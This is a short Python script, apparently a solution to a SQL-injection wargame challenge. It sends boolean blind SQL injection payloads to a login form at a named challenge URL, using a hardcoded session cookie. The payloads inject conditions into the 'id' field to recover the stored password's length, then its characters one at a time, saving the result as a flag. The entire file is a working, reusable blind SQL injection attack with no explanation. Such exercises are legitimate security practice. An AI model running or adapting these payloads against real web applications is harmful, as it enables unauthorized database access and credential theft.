from pwn import *
import requests
import json

flag = ''

length = 0

url = "https://bob.rubiya.kr/sqli2/"
cookies={'PHPSESSID':"61r5nvituc4cc876d1b4ud5614"}
#session = dict(PHPSESSID="61r5nvituc4cc876d1b4ud5614")
log.info("Start")
log.info("Find length of the password")

#data = {'id':"1' or length(pw) > 32",'pw':'admin'}
#print data
#req = requests.post(url, data=data, cookies=cookies)

#print req.text

for i in range(20, 30):
	try:
		data = {'id':"1' or length(pw)=" + str(i) + "#", 'pw':'admin'}
		req = requests.post(url, data=data, cookies=cookies)
		#print req.text
	except:
		log.failure("Error Occured")
		continue
	if 'success' in req.text:
		length = i
		break
log.success("Found Length : %d"%(length))
log.info("Find password")

for i in range(1, length+1):
	for j in range(20, 127):
		try:
			data={'id': "1' or ascii(substr(pw, " + str(i) +",1))=" + str(j) + "#", 'pw':'admin'}
			#print data
			req = requests.post(url, data=data, cookies=cookies)
		except:
			log.failure("Error Occured")
			continue
		if 'success' in req.text:
			flag += chr(j)
			break
		log.success("Found %s"%(flag))
log.success("Found password : %s"%(flag))
